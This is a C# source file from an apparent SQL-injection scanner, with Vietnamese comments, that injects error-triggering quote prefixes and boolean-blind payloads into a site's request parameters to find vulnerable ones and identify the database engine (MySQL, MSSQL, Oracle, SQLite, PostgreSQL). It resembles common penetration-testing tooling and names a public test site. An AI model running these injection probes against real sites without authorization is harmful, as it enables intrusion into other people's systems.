using System;
using System.Collections.Generic;
using System.Net.Http;
using System.Text;
using System.Threading.Tasks;
using SQLiScanner.Modules;

namespace SQLiScanner
{
    public class DatabaseDetector
    {
        private readonly HttpClient _client;

        public DatabaseDetector(HttpClient client)
        {
            _client = client;
        }

        public async Task<DetectionResult> DetectAsync(CrawlResult target)
        {
            foreach (var param in target.Params)
            {
                string paramName = param.Key;
                string originalValue = param.Value;

                (string? _, byte[]? baseBytes, int baseStatusCode) = await SendRequestAsync(target, paramName, originalValue);
                int baseLength = baseBytes?.Length ?? 0;

                if (baseBytes == null) continue;

                List<string> prefixes = GetPossiblePrefixes(originalValue);

                foreach (string prefix in prefixes)
                {
                    // Tạo payload gây lỗi (VD: 1')
                    string errorPayload = originalValue + prefix;

                    (string? responseHtml, _, int errorCode) = await SendRequestAsync(target, paramName, errorPayload);

                    if (string.IsNullOrEmpty(responseHtml))
                    {
                        Console.ForegroundColor = ConsoleColor.Yellow;
                        Console.WriteLine("[-] Không nhận được phản hồi mong muốn");
                        Console.ResetColor();
                        continue;
                    }

                    // Kiểm tra html response có chứa các từ khóa để nhận diện database không
                    var dbType = AnalyzeErrorText(responseHtml);

                    if (dbType != DbType.Unknow)
                    {
                        PrintResult(paramName, prefix, dbType, "Error-Based");
                        return new DetectionResult
                        {
                            DatabaseType = dbType,
                            VulnerableParam = paramName,
                            WorkingPrefix = prefix
                        };
                    }

                    // --- GIAI ĐOẠN 2: BOOLEAN/BLIND DETECTION (Nếu không thấy lỗi text) ---

                    if (baseLength > 0)
                    {
                        // Thử với từng loại DB để xem cái nào trả về True (Length không đổi)
                        Console.WriteLine($"    [*] Kiểm tra lỗ hổng Blind SQLi...");
                        var blindResult = await DetectBlindSqlAsync(
                                                    target,
                                                    paramName, 
                                                    originalValue, 
                                                    prefix,
                                                    baseLength, 
                                                    baseStatusCode);
                        if (blindResult.DatabaseType != DbType.Unknow)
                        {
                            return blindResult;
                        }
                    }

                }
            }

            return new DetectionResult();
        }

        private async Task<DetectionResult> DetectBlindSqlAsync(
            CrawlResult target, 
            string paramName,
            string originalValue,
            string prefix,
            int baseLength,
            int baseStatusCode)
        {
            if (await TestBooleanPayload(
                target,
                paramName,
                originalValue,
                prefix, 
                " AND LENGTH(VERSION())>0",
                " AND LENGTH(VERSION())<0",
                " %23",
                baseLength,
                baseStatusCode))
            {
                PrintResult(paramName, prefix, DbType.MySQL, "Blind-Based");
                return new DetectionResult { DatabaseType = DbType.MySQL, VulnerableParam = paramName, WorkingPrefix = prefix };
            }

            if (await TestBooleanPayload(target,
                paramName,
                originalValue, 
                prefix,
                " AND LEN(@@VERSION)>0",
                " AND LEN(@@VERSION)<0", 
                " -- ",
                baseLength,
                baseStatusCode))
            {
                PrintResult(paramName, prefix, DbType.MSSQL, "Blind-Based");
                return new DetectionResult { DatabaseType = DbType.MSSQL, VulnerableParam = paramName, WorkingPrefix = prefix };
            }

            if (await TestBooleanPayload(target,
                paramName, 
                originalValue, 
                prefix, 
                " AND (SELECT 1 FROM DUAL)=1",
                " AND (SELECT 1 FROM DUAL)=0",
                " -- ",
                baseLength,
                baseStatusCode))
            {
                PrintResult(paramName, prefix, DbType.Oracle, "Blind-Based");
                return new DetectionResult { DatabaseType = DbType.Oracle, VulnerableParam = paramName, WorkingPrefix = prefix };
            }

            if (await TestBooleanPayload(
                target,
                paramName, 
                originalValue, 
                prefix, 
                " AND sqlite_version()!=''",
                " AND sqlite_version()=''",
                " -- ", 
                baseLength,
                baseStatusCode))
            {
                PrintResult(paramName, prefix, DbType.SQLite, "Blind-Based");
                return new DetectionResult { DatabaseType = DbType.SQLite, VulnerableParam = paramName, WorkingPrefix = prefix };
            }

            if (await TestBooleanPayload(
                target,
                paramName,
                originalValue,
                prefix,
                " AND LENGTH(version())>0",   
                " AND LENGTH(version())<0", 
                " -- ",
                baseLength,
                baseStatusCode))
            {
                PrintResult(paramName, prefix, DbType.PostgreSQL, "Blind-Based");
                return new DetectionResult { DatabaseType = DbType.PostgreSQL, VulnerableParam = paramName, WorkingPrefix = prefix };
            }

            return new DetectionResult { DatabaseType = DbType.Unknow };
        }

        #region Các hàm phụ trợ
        private async Task<(string? html, byte[]? bytes, int statusCode)> SendRequestAsync(CrawlResult target, string injectKey, string injectValue)
        {
            try
            {
                var checkParams = new Dictionary<string, string>(target.Params);
                checkParams[injectKey] = injectValue;

                var method = new HttpMethod(target.HttpMethod.ToUpper());

                HttpRequestMessage request;

                if (method == HttpMethod.Get)
                {
                    var uriBuilder = new UriBuilder(target.FullUrl);
                    var query = System.Web.HttpUtility.ParseQueryString(string.Empty);
                    foreach (var p in checkParams) query[p.Key] = p.Value;
                    uriBuilder.Query = query.ToString();

                    request = new HttpRequestMessage(method, uriBuilder.ToString());

                }
                else // POST
                {
                    request = new HttpRequestMessage(method, target.FullUrl);
                    request.Content = new FormUrlEncodedContent(checkParams);
                }

                if (!request.Headers.Contains("User-Agent"))
                {
                    request.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)");
                }

                Console.WriteLine($"\n    Đang kiểm tra URL: {request.RequestUri}");
                using var response = await _client.SendAsync(request, HttpCompletionOption.ResponseContentRead);
                
                var bytes = await response.Content.ReadAsByteArrayAsync();

                var charset = response.Content.Headers.ContentType?.CharSet;
                var encoding = (charset is not null) ? Encoding.GetEncoding(charset) : Encoding.UTF8;


                return (encoding.GetString(bytes), bytes, (int)response.StatusCode);
            }
            catch (Exception ex)
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine($"[ERROR] Gửi Request thất bại: {ex.Message}");
                Console.ResetColor();
                return (null, null, 0);
            }
        }

        private async Task<bool> TestBooleanPayload(
            CrawlResult target,
            string paramName,
            string originalValue,
            string prefix, 
            string trueLogicPayload, 
            string falseLogicPayload, 
            string comment,
            int baseLength,
            int baseStatusCode)
        {
            // 1. GỬI PAYLOAD TRUE (Mong đợi: Giống trang gốc)
            // ---------------------------------------------------------
            string fullPayloadTrue = $"{originalValue}{prefix}{trueLogicPayload} {comment}";
            Console.WriteLine($"\n    THỬ PAYLOAD LUÔN ĐÚNG:");
            if (target.FullUrl == "http://testasp.vulnweb.com/Login.asp?RetURL=%2FDefault.asp%3F" && target.HttpMethod.ToUpper() == "POST")
            {
                Console.WriteLine();
            }
            (string? htmlTrue, byte[]? bytesTrue, int statusTrue) = await SendRequestAsync(target, paramName, fullPayloadTrue);

            Console.ForegroundColor = ConsoleColor.Yellow;
            if (bytesTrue == null)
            {
                Console.WriteLine("    [-] Không nhận được phản hồi từ mục tiêu. Hãy kiểm tra lại kết nối Internet, hoặc có thể payload vừa bị chặn.");
                Console.ResetColor();
                return false;
            }

            if (statusTrue != baseStatusCode)
            {
                Console.WriteLine($"    [-] Mã phản hồi [{statusTrue}] trả về không giống lúc không có Payload [{baseStatusCode}]. Payload có thể sai hoặc bị chặn.");
                Console.ResetColor();
                return false;
            }
            // Nếu Payload True mà lại ra kết quả khác trang gốc -> Có thể bị WAF chặn hoặc làm hỏng query -> FALSE
            if (!IsSimilar(baseLength, bytesTrue.Length, 0.15))
            {
                Console.WriteLine("    [-] Nội dung trả về không giống lúc đầu. Hãy kiểm tra thủ công.");
                Console.ResetColor();
                return false;
            }
            Console.ResetColor();

            // 2. GỬI PAYLOAD FALSE (Mong đợi: KHÁC trang gốc)
            // ---------------------------------------------------------
            string fullPayloadFalse = $"{originalValue}{prefix}{falseLogicPayload} {comment}";
            Console.WriteLine($"\n    THỬ PAYLOAD LUÔN SAI:");
        
            (string? htmlFalse, byte[]? bytesFalse, int statusFalse) = await SendRequestAsync(target, paramName, fullPayloadFalse);
            Console.ForegroundColor = ConsoleColor.Yellow;

            if (bytesFalse == null)
            {
                Console.WriteLine("    [-] Không nhận được phản hồi từ mục tiêu. Hãy kiểm tra lại kết nối Internet, hoặc có thể payload vừa bị chặn.");
                Console.ResetColor();
                return false;
            }

            Console.ResetColor();

            if (statusFalse != baseStatusCode)
            {
                return true;
            }
            else
            {
                
            }

            // Nếu Payload False mà vẫn trả về 200 OK và độ dài Y HỆT True -> Web này khả năng cao web lab -> FALSE
            if (!IsSimilar(baseLength, bytesFalse.Length, 0.15)) return true;


            Console.ForegroundColor = ConsoleColor.Red;
            Console.WriteLine("[!] Web không bị ảnh hưởng bời SQL -> Khả năng cao đây là web thử nghiệm không phải web thực tế.");
            Console.ResetColor();
            return false;
        }

        private DbType AnalyzeErrorText(string html)
        {
            if (string.IsNullOrEmpty(html)) return DbType.Unknow;
            if (html.Contains("MySQL") || html.Contains("MariaDB")) return DbType.MySQL;
            if (html.Contains("SQL Server") || html.Contains("ODBC") || html.Contains("Unclosed quotation mark")) return DbType.MSSQL;
            if (html.Contains("ORA-") || html.Contains("Oracle")) return DbType.Oracle;
            if (html.Contains("PostgreSQL") || html.Contains("unterminated quoted string")) return DbType.PostgreSQL;
            if (html.Contains("SQLite")) return DbType.SQLite;
            return DbType.Unknow;
        }

        private List<string> GetPossiblePrefixes(string value)
        {
            var list = new List<string>();
            bool isNumeric = long.TryParse(value, out _);
            if (isNumeric) 
            {
                list.Add(""); 
                list.Add("'"); 
                list.Add("\""); 
            }
            else
            { 
                list.Add("'"); 
                list.Add("\""); 
                list.Add(""); 
            }
            list.Add(")"); 
            list.Add("')");
            return list;
        }

        private bool IsSimilar(int baseLength, int newLength, double tolerancePercent)
        {
            int diff = Math.Abs(newLength - baseLength);
            return diff <= (baseLength * tolerancePercent);
        }

        private void PrintResult(string param, string prefix, DbType db, string method)
        {
            Console.ForegroundColor = ConsoleColor.Green;
            Console.WriteLine($"[!] DETECTED ({method}): Param [{param}]");
            Console.WriteLine($"    -> DB: {db} | Prefix: [{prefix}]");
            Console.ResetColor();
        }

        #endregion
    }
}